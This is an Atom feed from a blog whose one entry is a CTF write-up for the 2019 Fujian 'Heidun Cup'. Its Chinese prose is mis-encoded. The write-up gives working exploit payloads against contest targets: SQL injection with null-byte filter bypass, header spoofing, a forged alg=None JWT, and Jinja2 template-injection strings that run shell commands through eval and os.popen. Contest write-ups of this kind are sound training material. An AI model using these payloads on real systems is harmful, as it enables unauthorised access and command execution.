<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>QYMUA&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://qymua.com/"/>
  <updated>2019-09-20T11:24:30.000Z</updated>
  <id>http://qymua.com/</id>
  
  <author>
    <name>DEKU</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019 ç¦å»ºçœç½‘ç»œå®‰å…¨å®£ä¼ å‘¨é»‘ç›¾æ¯Writeup</title>
    <link href="http://qymua.com/2019/09/16/2019-%E7%A6%8F%E5%BB%BA%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A3%E4%BC%A0%E5%91%A8%E9%BB%91%E7%9B%BE%E6%9D%AFWriteup/"/>
    <id>http://qymua.com/2019/09/16/2019-ç¦å»ºçœç½‘ç»œå®‰å…¨å®£ä¼ å‘¨é»‘ç›¾æ¯Writeup/</id>
    <published>2019-09-16T13:57:47.000Z</published>
    <updated>2019-09-20T11:24:30.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¤§ä¸‰æ¥æ£’å†²åˆº,è¿™ä¸€æˆ˜æ— ç–‘éœ€è¦å–å¾—å¥½çš„æˆç»©ï¼Œä¸ºåè¾ˆæ ‘ç«‹æ¦œæ ·ï¼ä¸è¿‡ç¦å»ºçœâ€é»‘ç›¾æ¯â€å¤§å¤šéƒ½æ˜¯åŸºç¡€å…¥é—¨é¢˜,å°±ç®—èµ¢äº†,ä¹Ÿä¸èƒ½å¤ªå¾—æ„XD è·¯è¿˜é•¿~ä»»é‡è€Œé“è¿œå‘,è¿™é‡Œå°±æŒ‘å‡ é¢˜è‡ªå·±åšè¿‡çš„é¢˜ç›®è®²ä¸‹,miscå¤ªåŸºç¡€å°±ä¸å¤šè¯´äº†,binä¹Ÿä¸è¯´äº†ï¼Œå®³ï¼Œä»Šå¹´ä¾æ—§æ˜¯ä¸ä¼šå†™pwnçš„èœèœ</p><p>ç®€å•ä»‹ç»ä¸‹â€é»‘ç›¾æ¯â€èµ›åˆ¶,æ¯”èµ›æ—¶é•¿6å°æ—¶,ä¸ŠåŠåœºæ ‡å‡†çš„å¤ºæ——èµ›,ä½†æ²¡æœ‰ä¸€è¡€å¥–åŠ±æœºåˆ¶,ä¸‹åŠåœºä¼ä¸šæ¸—é€,æœ€åç†è®ºçŸ¥è¯†ç«èµ›ç»“å°¾(ç­‰ä¿é—®é¢˜)</p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="guess-the-key"><a href="#guess-the-key" class="headerlink" title="guess the key"></a>guess the key</h3><p>ç¨‹åºæä¾›äº†åŠ å¯†æ–¹å¼ï¼Œå’Œä¸€å¯¹æ˜æ–‡å¯†æ–‡</p><p>å…ˆé€†å‘åŠ å¯†ç®—æ³•,å†™å‡ºç ´è§£keyçš„è„šæœ¬,å†çŒœæµ‹å¦ä¸€ä»½å¯†æ–‡å¯èƒ½ä½¿ç”¨çš„Keyå³å¯</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">plain_text = open(<span class="string">'msg01'</span>,<span class="string">'r'</span>).read().strip()</span><br><span class="line">cipher_text = open(<span class="string">'msg01.enc'</span>,<span class="string">'r'</span>).read().strip()</span><br><span class="line">cipher2_text = open(<span class="string">'msg02.enc'</span>,<span class="string">'r'</span>).read().strip()</span><br><span class="line"></span><br><span class="line">plain_text = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> plain_text]</span><br><span class="line">cipher_text = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> cipher_text]</span><br><span class="line">cipher2_text = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> cipher2_text]</span><br><span class="line"></span><br><span class="line">t = <span class="number">0</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">key = <span class="string">''</span></span><br><span class="line">plain = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain_text)):</span><br><span class="line">c = ((cipher_text[i] - (i*i) - plain_text[i]) ^ t) &amp; <span class="number">0xff</span></span><br><span class="line">key += chr(c)</span><br><span class="line">t = plain_text[i]</span><br><span class="line">key = key[<span class="number">0</span>:<span class="number">31</span>]</span><br><span class="line"><span class="keyword">print</span> key</span><br><span class="line"></span><br><span class="line">//VeryVeryLongKeyYouWillNeverKnowVery</span><br><span class="line"></span><br><span class="line">key = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher2_text)):</span><br><span class="line">c = (cipher2_text[i] - (key[i % len(key)] ^ f) - i*i) &amp; <span class="number">0xff</span></span><br><span class="line">plain += chr(c)</span><br><span class="line">f = c</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> plain</span><br><span class="line"></span><br><span class="line">//She had been shopping <span class="keyword">with</span> her Mom <span class="keyword">in</span> Wal-Mart. She must have been <span class="number">6</span> years old, this beautiful brown haired, freckle-faced image of innocence. It was pouring outside. The kind of rain that gushes over the top of rain gutters, so much <span class="keyword">in</span> a hurry to hit the Earth, it has no time to flow down the spout.flag&#123;<span class="number">101</span>a6ec9f938885df0a44f20458d2eb4&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="i-have-the-flag"><a href="#i-have-the-flag" class="headerlink" title="i have the_flag"></a>i have the_flag</h3><p>é¡µé¢jsä¸€å †æ²¡ç”¨çš„å‡½æ•°ï¼Œåªæœ‰ä¸€ä¸ª<code>ck</code>å‡½æ•°æœ‰ç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ck</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ic</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> a = [<span class="number">118</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>];</span><br><span class="line">    <span class="keyword">if</span> (s.length == a.length) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i] - s.charCodeAt(i) != <span class="number">3</span>)</span><br><span class="line">                <span class="keyword">return</span> ic = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ic = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ic = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶è§£å‡ºè¿™ä¸²Asciiå€¼æ‹¿å»æäº¤å°±å¯ä»¥æˆåŠŸgetflag</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">I have the Flag</span><br><span class="line">Type <span class="keyword">in</span> something <span class="keyword">to</span> <span class="builtin-name">get</span> the flag.</span><br><span class="line"></span><br><span class="line">Tips: Maybe you have the flag.</span><br><span class="line"></span><br><span class="line">Something: </span><br><span class="line">simpleedu123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!</span><br><span class="line"></span><br><span class="line">muWn9NU0H6erBN/w+C7HVg</span><br></pre></td></tr></table></figure><h3 id="a-little-hard"><a href="#a-little-hard" class="headerlink" title="a little hard"></a>a little hard</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</span><br><span class="line">$cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</span><br><span class="line">$cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</span><br><span class="line">$cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">$cip = <span class="string">"0.0.0.0"</span>;</span><br><span class="line"><span class="keyword">return</span> $cip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$GetIPs = GetIP();</span><br><span class="line"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½IPï¿½ï¿½ï¿½Ú·ï¿½ï¿½ï¿½ï¿½Ğ±ï¿½Ö®ï¿½Ú£ï¿½"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ï¼Œé˜…è¯»æºç å¯çŸ¥å¯é€šè¿‡ä¼ªé€ XFFå¤´ä»¤å˜é‡<code>$GetsIP</code>å€¼ä¸º<code>1.1.1.1</code>ï¼Œæ„é€ è¯·æ±‚å¤´å³å¯å¾—åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /hard/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">202.0</span><span class="number">.0</span><span class="number">.37</span></span><br><span class="line">x-forwarded-<span class="keyword">for</span>: <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h3 id="click-1"><a href="#click-1" class="headerlink" title="click_1"></a>click_1</h3><p>è¿™é¢˜å°±å¤ªç®€å•äº†</p><p>æŸ¥çœ‹æºç ç³»åˆ—</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"esc"</span> <span class="attr">style</span>=<span class="string">"position:absolute;"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onfocus</span>=<span class="string">"nokp();"</span> <span class="attr">onclick</span>=<span class="string">"window.location='?key=700c';"</span> <span class="attr">value</span>=<span class="string">"click me!"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">readonly</span> <span class="attr">style</span>=<span class="string">"width:350;"</span> <span class="attr">id</span>=<span class="string">"hint"</span> <span class="attr">value</span>=<span class="string">"do you want to join? catch button, if you can!"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°<code>?key=700c</code>ï¼Œäºæ˜¯æ„é€ URLè®¿é—®<a href="http://202.0.0.37/click/?key=700cå³å¯å¾—åˆ°flag" target="_blank" rel="noopener">http://202.0.0.37/click/?key=700cå³å¯å¾—åˆ°flag</a></p><h3 id="èŠ±å¼è¿‡waf"><a href="#èŠ±å¼è¿‡waf" class="headerlink" title="èŠ±å¼è¿‡waf"></a>èŠ±å¼è¿‡waf</h3><p>2018é»‘ç›¾æ¯åŸé¢˜ï¼Œä½¿ç”¨å·¥å…·æ‰«æåå‘ç°æœ‰<code>www.zip</code>ï¼Œä¸‹è½½æºç å¼€å§‹ä»£ç å®¡è®¡</p><p><code>function.php</code>: eregi å¯ä»¥ä½¿ç”¨ %00æˆªæ–­æ­£åˆ™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filtering</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $check= eregi(<span class="string">'select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile'</span>, $str);</span><br><span class="line">    <span class="keyword">if</span>($check)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"éæ³•å­—ç¬¦!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>content.php</code>: é‡Œé¢ç›´æ¥æ‹¼æ¥ç»™çš„å‚æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'./global.php'</span>;</span><br><span class="line">extract($_REQUEST);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from test.content where id=$message_id"</span>;</span><br></pre></td></tr></table></figure><p>æ„é€ è¯·æ±‚å¾—åˆ°flagã€‚</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message_id=<span class="string">"%00"</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,<span class="title">flag</span>,4 <span class="title">from</span> <span class="title">flag</span></span></span><br></pre></td></tr></table></figure><h3 id="å¿˜è®°å¯†ç äº†"><a href="#å¿˜è®°å¯†ç äº†" class="headerlink" title="å¿˜è®°å¯†ç äº†"></a>å¿˜è®°å¯†ç äº†</h3><p>é¢˜ç›®ä¸€å¼€å§‹åªæœ‰ä¸€ä¸ªæ–‡æœ¬æ¡†ï¼Œè¦æ±‚å¡«å…¥emailï¼Œéšä¾¿å¡«ä¸€ä¸ªåæœ‰alertæç¤ºå‰å¾€<a href="mailto:`/forget/step2.php?email=youremail@address.com" target="_blank" rel="noopener">`/forget/step2.php?email=youremail@address.com</a>&amp;check=?????`è¿›è¡Œä¸‹ä¸€æ­¥</p><p>å‘ç°ç½‘é¡µæºä»£ç ä¸­æœ‰é‡è¦ä¿¡æ¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"admin"</span> <span class="attr">content</span>=<span class="string">"admin@simplexue.com"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"editor"</span> <span class="attr">content</span>=<span class="string">"Vim"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>å¹¶ä¸”<code>step2.php</code>ä¸­å«æœ‰ä¸€ä¸ªæäº¤åˆ°<code>submit.php</code>çš„è¡¨å•ï¼Œæœ‰<code>emailAddress</code>å­—æ®µå’Œ<code>token</code>å­—æ®µ</p><p>çœ‹åˆ°Vimå¯ä»¥æƒ³åˆ°Vimç¼–è¾‘å™¨åœ¨éæ­£å¸¸é€€å‡ºçš„æƒ…å†µä¸‹ä¼šç•™ä¸‹<code>.swp</code>æ–‡ä»¶ï¼Œç»è¿‡é€ä¸ªæµ‹è¯•å‘ç°äº†<code>submit.php</code>çš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forget/.submit.php.swp</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">........è¿™ä¸€è¡Œæ˜¯çœç•¥çš„ä»£ç ........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å¦‚æœç™»å½•é‚®ç®±åœ°å€ä¸æ˜¯ç®¡ç†å‘˜åˆ™ die()</span></span><br><span class="line"><span class="comment">æ•°æ®åº“ç»“æ„</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- è¡¨çš„ç»“æ„ `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT '0',</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- è½¬å­˜è¡¨ä¸­çš„æ•°æ® `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, '****ä¸å¯è§***', '***ä¸å¯è§***', 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........è¿™ä¸€è¡Œæ˜¯çœç•¥çš„ä»£ç ........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"å¤±è´¥äº†å‘€"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ä»£ç æ„é€ <code>token</code>ï¼Œå¾—åˆ°flag</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">GET</span> /forget/setp2.php?<span class="attribute">emailAddress</span>=admin@simplexue.com&amp;token=0000000000</span><br></pre></td></tr></table></figure><h3 id="pyä¸€æ³¢å§-ssti-jwt-1"><a href="#pyä¸€æ³¢å§-ssti-jwt-1" class="headerlink" title="pyä¸€æ³¢å§-ssti+jwt_1"></a>pyä¸€æ³¢å§-ssti+jwt_1</h3><p><code>JWT alg=None ç­¾åbypassæ”»å‡»</code> -&gt; <code>SSTI</code>ï¼Œå¼ºè¡ŒæŠŠä¸¤é“é¢˜æ‹¼æˆä¸€é“é¢˜ï¼Œæ²¡æœ‰ç¬¬ä¸€æ­¥ä¸èƒ½è¿›å…¥SSTI</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">éšä¾¿è¾“å…¥ä¸€ä¸ªç”¨æˆ·åå¯†ç ï¼Œå°†cookieé‡Œé¢çš„tokenæå–å‡ºæ¥ï¼Œè§£base64å¯å¾—</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">&#123;"alg":"HS256","typ":"JWT"&#125;.&#123;"username":"admin1"&#125;.signature</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”Ÿæˆä¸€ä¸ªç”¨æˆ·åä¸ºadminçš„<code>token</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8 </span></span><br><span class="line"><span class="comment">#PyJWT</span></span><br><span class="line"><span class="keyword">import</span> jwt </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_token</span><span class="params">()</span>:</span> </span><br><span class="line">    payload = &#123; </span><br><span class="line">         <span class="string">"username"</span>: <span class="string">"admin"</span> </span><br><span class="line">    &#125; </span><br><span class="line">    token = jwt.encode(payload, <span class="literal">None</span>, algorithm=<span class="literal">None</span>) </span><br><span class="line">    <span class="keyword">print</span> token </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">create_token()</span><br></pre></td></tr></table></figure><p>æŠŠtokenæ¢ä¸Šå»ï¼Œå°±å¯ä»¥è¿›å…¥SSTIæµç¨‹äº†ã€‚</p><p>SSTIè¿‡æ»¤äº†ï¼šå•å¼•å·ã€osã€systemã€[]</p><p>Jinja2å¯¹ä¸ä¸å­˜åœ¨çš„å¯¹è±¡æœ‰ä¸€ä¸ªç‰¹æ®Šçš„å®šä¹‰<strong>Undefined</strong>ç±»ï¼Œ<code>&lt;class &#39;jinja2.runtime.Undefined&#39;&gt;</code></p><p><strong>jinja2/runtime.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@implements_to_string</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Undefined</span><span class="params">(object)</span>:</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ„é€ <code>title=</code>å°±å¯ä»¥æäº‹æƒ…äº†ï¼Œå‘ç°æœ‰ä¸ª<code>eval</code>ï¼Œå°±æ˜¯å®ƒäº†ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;'new_context': &lt;function new_context at 0x7fc79bb4faa0&gt;, 'chain': &lt;type 'itertools.chain'&gt;, '_context_function_types': (&lt;type 'function'&gt;, &lt;type 'instancemethod'&gt;), 'resolve_or_missing': &lt;function resolve_or_missing at 0x7fc79bb4fcf8&gt;, 'Namespace': &lt;class 'jinja2.utils.Namespace'&gt;, 'ContextMeta': &lt;class 'jinja2.runtime.ContextMeta'&gt;, 'evalcontextfunction': &lt;function evalcontextfunction at 0x7fc79bd919b0&gt;, 'escape': &lt;built-in function escape&gt;, 'LoopContext': &lt;class 'jinja2.runtime.LoopContext'&gt;, '_first_iteration': &lt;object object at 0x7fc79f5b2190&gt;, 'TemplateNotFound': &lt;class 'jinja2.exceptions.TemplateNotFound'&gt;,Â·Â·Â·'eval': &lt;built-in function eval&gt;</span><br></pre></td></tr></table></figure><p>ä¸èƒ½ç”¨<code>[]</code>å¯ä»¥ä½¿ç”¨<code>.get()</code>ç»•è¿‡ï¼Œè¢«è¿‡æ»¤çš„å­—ç¬¦ä¸²å¯ä»¥æ‹†åˆ†æˆ2ä¸ªå­—ç¬¦ä¸²æˆ–è€…ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ–¹æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;vvv.__class__.__init__.__globals__.get(<span class="string">"__bui"</span>+<span class="string">"ltins__"</span>).get(<span class="string">"e"</span>+<span class="string">"val"</span>)(<span class="string">"__imp"</span>+<span class="string">"ort__(\"o"</span>+<span class="string">"s\").po"</span>+<span class="string">"pen(\"ls\").read()"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤åˆ—ç›®å½•ï¼Œå‘ç°æ²¡æœ‰ä¼ è¯´ä¸­çš„flagï¼Œä½†æ˜¯å‘ç°äº†ä¸€ä¸ªä»¥æ•°å­—+è‹±æ–‡ç»„åˆä¸ºæ–‡ä»¶åçš„æ–‡ä»¶ï¼Œç»è¿‡ç¡®è®¤ï¼Œå°±æ˜¯flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;vvv.__class__.__init__.__globals__.get(<span class="string">"__bui"</span>+<span class="string">"ltins__"</span>).get(<span class="string">"e"</span>+<span class="string">"val"</span>)(<span class="string">"__imp"</span>+<span class="string">"ort__(\"o"</span>+<span class="string">"s\").po"</span>+<span class="string">"pen(\"cat f41321d3b61338c8d239e75d971f34a4\").read()"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜æºç åœ¨<code>/app/none</code>è·¯å¾„ä¸‹ï¼Œä¹Ÿå¯é€šè¿‡æ„é€ ç±»ä¼¼å‘½ä»¤è¿›è¡Œè¯»å–ã€‚</p><h3 id="hardupload"><a href="#hardupload" class="headerlink" title="hardupload"></a>hardupload</h3><p>åœ¨ä»Šå¹´çš„Google CTF ä¸­å‡ºäº†ä¸€é“Blind XXE é¢˜ bnvï¼Œå¯ä»¥åšå‚è€ƒ</p><p>ä¸æ‡‚xxeå»ºè®®å…ˆäº†è§£ä¸€æ³¢</p><p><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" 